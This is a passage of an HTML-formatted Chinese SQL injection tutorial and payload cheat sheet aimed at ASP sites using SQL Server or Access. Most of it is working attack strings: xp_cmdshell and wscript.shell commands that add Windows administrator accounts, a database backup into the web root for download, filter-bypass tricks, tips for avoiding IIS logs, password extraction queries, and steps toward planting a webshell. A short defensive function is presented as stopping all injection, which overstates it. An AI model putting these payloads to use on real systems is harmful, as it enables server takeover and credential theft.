<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>作用：返回数字的绝对值（在猜解汉字的时候会用到） </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Access：A between B And C SQLServer：A between B And C </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>作用：判断A是否界于B与C之间 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第三节、中文处理方法 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>在注入中碰到中文字符是常有的事，有些人一碰到中文字符就想打退堂鼓了。其实只要对中文的编码有所了解，“中文恐惧症”很快可以克服。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>先说一点常识： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Access中，中文的ASCII码可能会出现负数，取出该负数后用abs()取绝对值，汉字字符不变。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>SQLServer中，中文的ASCII为正数，但由于是UNICODE的双位编码，不能用函数ascii()取得ASCII码，必须用函数unicode ()返回unicode值，再用nchar函数取得对应的中文字符。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>了解了上面的两点后，是不是觉得中文猜解其实也跟英文差不多呢？除了使用的函数要注意、猜解范围大一点外，方法是没什么两样的。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:18px'><strong>高 级 篇 </strong></span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>看完入门篇和进阶篇后，稍加练习，破解一般的网站是没问题了。但如果碰到表名列名猜不到，或程序作者过滤了一些特殊字符，怎么提高注入的成功率？怎么样提高猜解效率？请大家接着往下看高级篇。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第一节、利用系统表注入SQLServer数据库 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>SQLServer是一个功能强大的数据库系统，与操作系统也有紧密的联系，这给开发者带来了很大的方便，但另一方面，也为注入者提供了一个跳板，我们先来看看几个具体的例子： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>① http://Site/url.asp?id=1;exec master..xp_cmdshell “net user name password /add”-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>分号;在SQLServer中表示隔开前后两句语句，--表示后面的语句为注释，所以，这句语句在SQLServer中将被分成两句执行，先是Select出ID=1的记录，然后执行存储过程xp_cmdshell，这个存储过程用于调用系统命令，于是，用net命令新建了用户名为name、密码为password的windows的帐号，接着： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>② http://Site/url.asp?id=1;exec master..xp_cmdshell “net localgroup name administrators /add”-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>将新建的帐号name加入管理员组，不用两分钟，你已经拿到了系统最高权限！当然，这种方法只适用于用sa连接数据库的情况，否则，是没有权限调用xp_cmdshell的。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>③ http://Site/url.asp?id=1 ;and db_name()&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>前面有个类似的例子and user&gt;0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>④ http://Site/url.asp?id=1;backup database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>这是相当狠的一招，从③拿到的数据库名，加上某些IIS出错暴露出的绝对路径，将数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！在不知道绝对路径的时候，还可以备份到网络地址的方法（如\\202.96.xx.xx\Share \1.db），但成功率不高。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>⑤ http://Site/url.asp?id=1 ;and (Select Top 1 name from sysobjects where xtype=’U’ and status&gt;0)&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>前面说过，sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype=’U’ and status&gt;0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。第二、第三个表名怎么获取？还是留给我们聪明的读者思考吧。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>⑥ http://Site/url.asp?id=1 ;and (Select Top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>从⑤拿到表名后，用object_id(‘表名’)获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4...就可以逐个获取所猜解表里面的字段名。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>以上6点是我研究SQLServer注入半年多以来的心血结晶，可以看出，对SQLServer的了解程度，直接影响着成功率及猜解速度。在我研究SQLServer注入之后，我在开发方面的水平也得到很大的提高，呵呵，也许安全与开发本来就是相辅相成的吧。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第二节、绕过程序限制继续注入 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>在入门篇提到，有很多人喜欢用’号测试注入漏洞，所以也有很多人用过滤’号的方法来“防止”注入漏洞，这也许能挡住一些入门者的攻击，但对ＳＱＬ注入比较熟悉的人，还是可以利用相关的函数，达到绕过程序限制的目的。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>在“ＳＱＬ注入的一般步骤”一节中，我所用的语句，都是经过我优化，让其不包含有单引号的；在“利用系统表注入SQLServer数据库”中，有些语句包含有’号，我们举个例子来看看怎么改造这些语句： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>简单的如where xtype=’U’，字符U对应的ASCII码是85，所以可以用where xtype=char(85)代替；如果字符是中文的，比如where name=’用户’，可以用where name=nchar(29992)+nchar(25143)代替。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>第三节、经验小结 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 1.有些人会过滤Select、Update、Delete这些关键字，但偏偏忘记区分大小写，所以大家可以用selecT这样尝试一下。 </p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>2.在猜不到字段名时，不妨看看网站上的登录表单，一般为了方便起见，字段名都与表单的输入框取相同的名字。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>3.特别注意：地址栏的+号传入程序后解释为空格，%2B解释为+号，%25解释为%号，具体可以参考URLEncode的相关介绍。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>4.用Get方法注入时，IIS会记录你所有的提交字符串，对Post方法做则不记录，所以能用Post的网址尽量不用Get。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>5. 猜解Access时只能用Ascii逐字解码法，SQLServer也可以用这种方法，只需要两者之间的区别即可，但是如果能用SQLServer的报错信息把值暴露出来，那效率和准确率会有极大的提高。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'><span style="font-size:18px">防 范 方 法 </span></span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> ＳＱＬ注入漏洞可谓是“千里之堤，溃于蚁穴”，这种漏洞在网上极为普遍，通常是由于程序员对注入不了解，或者程序过滤不严格，或者某个参数忘记检查导致。在这里，我给大家一个函数，代替ASP中的Request函数，可以对一切的SQL注入Say NO，函数如下： </p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Function SafeRequest(ParaName,ParaType) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'--- 传入参数 --- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'ParaName:参数名称-字符型 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'ParaType:参数类型-数字型(1表示以上参数是数字，0表示以上参数为字符) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Dim ParaValue </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ParaValue=Request(ParaName) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>If ParaType=1 then </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>If not isNumeric(ParaValue) then </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Response.write "参数" &amp; ParaName &amp; "必须为数字型！" </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Response.end </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>End if </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Else </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ParaValue=replace(ParaValue,"'","''") </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>End if </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>SafeRequest=ParaValue </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>End function </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>文章到这里就结束了，不管你是安全人员、技术爱好者还是程序员，我都希望本文能对你有所帮助。 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:18px'><strong>orgSql注射总结（早源于'or'1'='1） </strong></span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>最重要的表名：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from sysobjects</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysobjects ncsysobjects</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysindexes tsysindexes</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>syscolumns</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>systypes</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysusers</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysdatabases</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysxlogins</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysprocesses </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>当然还有很多啦哦 这就看你自己在实际操作中的应用啦!:)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>最重要的一些用户名（默认sql数据库中存在着的）</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>public</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>dbo</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>guest(一般禁止，或者没权限)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>db_sercurityadmin</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ab_dlladmin</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>一些默认扩展</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regaddmultistring </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regdeletekey </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regdeletevalue </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regenumkeys </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regenumvalues </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regread </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regremovemultistring </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_regwrite</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_availablemedia 驱动器相关</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_dirtree 目录</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_enumdsn ODBC连接</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_loginconfig 服务器安全模式信息</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_makecab 创建压缩卷</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_ntsec_enumdomains domain信息</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>xp_terminate_process 终端进程，给出一个PID</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>例如：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sp_addextendedproc 'xp_webserver', 'c:\temp\xp_foo.dll'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec xp_webserver</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sp_dropextendedproc 'xp_webserver'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>bcp "select * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' group by users.id having 1=1-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' group by users.id, users.username, users.password, users.privs having 1=1-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'; insert into users values( 666, 'attacker', 'foobar', 0xffff )-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='logintable'-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='logintable' where COLUMN_NAME NOT IN ('login_id')-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='logintable' where COLUMN_NAME NOT IN ('login_id','login_name')-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select TOP 1 login_name FROM logintable-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>union select TOP 1 password FROM logintable where login_name='Rahul'--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 构造语句：查询是否存在xp_cmdshell</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' union select @@version,1,1,1--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 1=(select @@VERSION)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 'sa'=(select System_user)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' union select ret,1,1,1 from foo--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' union select min(username),1,1,1 from users where username &gt; 'a'-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' union select min(username),1,1,1 from users where username &gt; 'admin'-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>' union select password,1,1,1 from users where username = 'admin'-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and user_name()='dbo'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select user_name()-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>; DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C：\WINNT\system32\cmd.exe /c net user swap 5245886 /add'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 1=(select count(*) FROM master.dbo.sysobjects where xtype = 'X' AND name = 'xp_cmdshell')</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;EXEC master.dbo.sp_addextendedproc 'xp_cmdshell', 'xplog70.dll'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>1=(%20select%20count(*)%20from%20master.dbo.sysobjects%20where%20xtype='x'%20and%20name='xp_cmdshell')</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 1=(select IS_SRVROLEMEMBER('sysadmin')) 判断sa权限是否</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 paths from newtable)-- 暴库大法</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 1=(select name from master.dbo.sysdatabases where dbid=7) 得到库名（从1到5都是系统的id，6以上才可以判断）</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 创建一个虚拟目录E盘：</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c：\inetpub\wwwroot\mkwebdir.vbs -w "默认 Web 站点" -v "e","e：\"'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>访问属性：（配合写入一个webshell）</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
